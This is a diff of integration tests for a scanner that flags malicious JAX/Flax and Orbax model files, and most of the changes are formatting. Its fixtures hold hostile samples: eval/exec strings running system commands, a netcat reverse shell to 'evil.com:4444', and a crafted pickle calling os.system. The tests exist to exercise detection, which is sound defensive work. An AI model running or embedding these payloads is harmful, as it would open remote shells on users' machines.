@@ -1,14 +1,9 @@
 """Integration tests for enhanced JAX/Flax scanning functionality."""
 
 import json
+
 import msgpack
 import numpy as np
-import os
-import pickle
-import tempfile
-from pathlib import Path
-
-import pytest
 
 from modelaudit.scanners.base import IssueSeverity
 from modelaudit.scanners.flax_msgpack_scanner import FlaxMsgpackScanner
@@ -86,7 +81,9 @@ class TestJaxFlaxIntegration:
             "__tree_flatten__": "lambda: eval('__import__(\"os\").system(\"id\")')",
             "model_config": {
                 "custom_activation": "lambda x: eval('__import__(\"os\").system(\"whoami\")') or x",
-                "loss_function": "exec('import subprocess; subprocess.call([\"nc\", \"-e\", \"/bin/sh\", \"evil.com\", \"4444\"])')",
+                "loss_function": (
+                    "exec('import subprocess; subprocess.call([\"nc\", \"-e\", \"/bin/sh\", \"evil.com\", \"4444\"])')"
+                ),
             }
         }
 
@@ -94,19 +91,21 @@ class TestJaxFlaxIntegration:
         """Test that clean Flax models don't trigger false positives."""
         clean_model = self.create_clean_flax_model()
         model_path = tmp_path / "clean_model.msgpack"
-        
+
         with open(model_path, "wb") as f:
             msgpack.pack(clean_model, f, use_bin_type=True)
-        
+
         scanner = FlaxMsgpackScanner()
         result = scanner.scan(str(model_path))
-        
+
         assert result.success
-        
+
         # Should have minimal issues
         critical_issues = [i for i in result.issues if i.severity == IssueSeverity.CRITICAL]
-        assert len(critical_issues) == 0, f"Clean model triggered critical issues: {[i.message for i in critical_issues]}"
-        
+        assert len(critical_issues) == 0, (
+            f"Clean model triggered critical issues: {[i.message for i in critical_issues]}"
+        )
+
         # Architecture should be detected
         assert result.metadata.get("model_architecture") == "transformer"
         assert result.metadata.get("estimated_parameters") > 300000
@@ -115,48 +114,48 @@ class TestJaxFlaxIntegration:
         """Test that malicious JAX models trigger security warnings."""
         malicious_model = self.create_malicious_jax_model()
         model_path = tmp_path / "malicious_model.jax"
-        
+
         with open(model_path, "wb") as f:
             msgpack.pack(malicious_model, f, use_bin_type=True)
-        
+
         scanner = FlaxMsgpackScanner()
         result = scanner.scan(str(model_path))
-        
+
         assert result.success
-        
+
         # Should trigger multiple critical issues
         critical_issues = [i for i in result.issues if i.severity == IssueSeverity.CRITICAL]
         assert len(critical_issues) >= 10, f"Expected many critical issues, got {len(critical_issues)}"
-        
+
         # Check for specific threat patterns
         issue_messages = [i.message.lower() for i in critical_issues]
-        
+
         expected_patterns = [
             "jax_array",
-            "orbax", 
+            "orbax",
             "eval",
             "exec",
             "subprocess",
             "negative dimensions"
         ]
-        
+
         for pattern in expected_patterns:
             assert any(pattern in msg for msg in issue_messages), f"Missing detection of {pattern}"
 
     def test_file_extension_support(self, tmp_path):
         """Test support for various JAX/Flax file extensions."""
         simple_model = {"params": {"layer": b"\x00" * 100}, "step": 1000}
-        
+
         extensions = [".msgpack", ".flax", ".orbax", ".jax"]
-        
+
         for ext in extensions:
             model_path = tmp_path / f"test_model{ext}"
             with open(model_path, "wb") as f:
                 msgpack.pack(simple_model, f)
-            
+
             # Test scanner can handle the extension
             assert FlaxMsgpackScanner.can_handle(str(model_path)), f"Cannot handle {ext} extension"
-            
+
             # Test actual scanning
             scanner = FlaxMsgpackScanner()
             result = scanner.scan(str(model_path))
@@ -166,7 +165,7 @@ class TestJaxFlaxIntegration:
         """Test support for large JAX/Flax models."""
         # Create a model with 100MB+ of data
         large_embedding = np.random.normal(0, 0.1, (100000, 512)).astype(np.float32).tobytes()
-        
+
         large_model = {
             "params": {
                 "large_embedding": large_embedding,
@@ -178,14 +177,14 @@ class TestJaxFlaxIntegration:
                 "vocab_size": 100000
             }
         }
-        
+
         model_path = tmp_path / "large_model.flax"
         with open(model_path, "wb") as f:
             msgpack.pack(large_model, f, use_bin_type=True)
-        
+
         scanner = FlaxMsgpackScanner()
         result = scanner.scan(str(model_path))
-        
+
         assert result.success
         # Large embedding model may be detected as transformer due to size
         assert result.metadata.get("model_architecture") in ["embedding", "transformer"]
@@ -195,7 +194,7 @@ class TestJaxFlaxIntegration:
         """Test scanning of clean Orbax checkpoint directories."""
         orbax_dir = tmp_path / "clean_orbax"
         orbax_dir.mkdir()
-        
+
         # Clean metadata
         metadata = {
             "version": "0.1.0",
@@ -207,7 +206,7 @@ class TestJaxFlaxIntegration:
                 "hidden_size": 128
             }
         }
-        
+
         # Clean parameter data
         params = {
             "model": {
@@ -217,28 +216,30 @@ class TestJaxFlaxIntegration:
                 }
             }
         }
-        
+
         with open(orbax_dir / "metadata.json", "w") as f:
             json.dump(metadata, f)
-            
+
         with open(orbax_dir / "params.json", "w") as f:
             json.dump(params, f)
-        
+
         scanner = JaxCheckpointScanner()
         result = scanner.scan(str(orbax_dir))
-        
+
         assert result.success
         assert result.metadata.get("checkpoint_type") == "orbax_checkpoint"
-        
+
         # Should have minimal critical issues
         critical_issues = [i for i in result.issues if i.severity == IssueSeverity.CRITICAL]
-        assert len(critical_issues) == 0, f"Clean Orbax checkpoint triggered critical issues: {[i.message for i in critical_issues]}"
+        assert len(critical_issues) == 0, (
+            f"Clean Orbax checkpoint triggered critical issues: {[i.message for i in critical_issues]}"
+        )
 
     def test_malicious_orbax_checkpoint(self, tmp_path):
         """Test detection of malicious Orbax checkpoints."""
         orbax_dir = tmp_path / "malicious_orbax"
         orbax_dir.mkdir()
-        
+
         # Malicious metadata
         malicious_metadata = {
             "version": "0.1.0",
@@ -249,38 +250,38 @@ class TestJaxFlaxIntegration:
                 "host_callback": "jax.experimental.host_callback.call(os.system, 'nc -e /bin/sh evil.com 4444')"
             }
         }
-        
+
         with open(orbax_dir / "metadata.json", "w") as f:
             json.dump(malicious_metadata, f)
-        
+
         # Create dangerous pickle file
         dangerous_pickle = (
-            b'\x80\x03'
-            b'cos\n'
-            b'system\n'
-            b'q\x00'
-            b'X\x06\x00\x00\x00'
-            b'whoami'
-            b'q\x01'
-            b'\x85'
-            b'q\x02'
-            b'R'
-            b'q\x03'
-            b'.'
+            b"\x80\x03"
+            b"cos\n"
+            b"system\n"
+            b"q\x00"
+            b"X\x06\x00\x00\x00"
+            b"whoami"
+            b"q\x01"
+            b"\x85"
+            b"q\x02"
+            b"R"
+            b"q\x03"
+            b"."
         )
-        
+
         with open(orbax_dir / "checkpoint", "wb") as f:
             f.write(dangerous_pickle)
-        
+
         scanner = JaxCheckpointScanner()
         result = scanner.scan(str(orbax_dir))
-        
+
         assert result.success
-        
+
         # Should trigger critical issues
         critical_issues = [i for i in result.issues if i.severity == IssueSeverity.CRITICAL]
         assert len(critical_issues) >= 3, f"Expected multiple critical issues, got {len(critical_issues)}"
-        
+
         # Check for pickle opcode detection
         issue_messages = [i.message.lower() for i in result.issues]
         assert any("pickle opcode" in msg for msg in issue_messages), "Should detect dangerous pickle opcodes"
@@ -322,17 +323,21 @@ class TestJaxFlaxIntegration:
                 "expected_arch": ["embedding", "transformer"]  # May be detected as either
             }
         ]
-        
+
         for i, test_case in enumerate(test_cases):
             model_path = tmp_path / f"arch_test_{i}.flax"
             with open(model_path, "wb") as f:
                 msgpack.pack(test_case["model"], f, use_bin_type=True)
-            
+
             scanner = FlaxMsgpackScanner()
             result = scanner.scan(str(model_path))
-            
+
             assert result.success
-            expected_archs = test_case["expected_arch"] if isinstance(test_case["expected_arch"], list) else [test_case["expected_arch"]]
+            expected_archs = (
+                test_case["expected_arch"]
+                if isinstance(test_case["expected_arch"], list)
+                else [test_case["expected_arch"]]
+            )
             actual_arch = result.metadata.get("model_architecture")
             assert actual_arch in expected_archs, \
                 f"Expected one of {expected_archs}, got {actual_arch}"
@@ -341,20 +346,20 @@ class TestJaxFlaxIntegration:
         """Test that enhanced JAX/Flax scanning works through CLI."""
         clean_model = self.create_clean_flax_model()
         model_path = tmp_path / "integration_test.jax"
-        
+
         with open(model_path, "wb") as f:
             msgpack.pack(clean_model, f, use_bin_type=True)
-        
+
         # Import and test via core scanning
         from modelaudit.core import scan_model_directory_or_file
-        
+
         result = scan_model_directory_or_file(str(model_path))
         assert result["success"]
         # Check that at least one asset was scanned and has the expected architecture
         assets = result.get("assets", [])
         assert len(assets) > 0
-        
+
         # Check file metadata for architecture info
         file_meta = result.get("file_metadata", {})
         model_metadata = file_meta.get(str(model_path), {})
-        assert model_metadata.get("model_architecture") == "transformer" 
+        assert model_metadata.get("model_architecture") == "transformer"
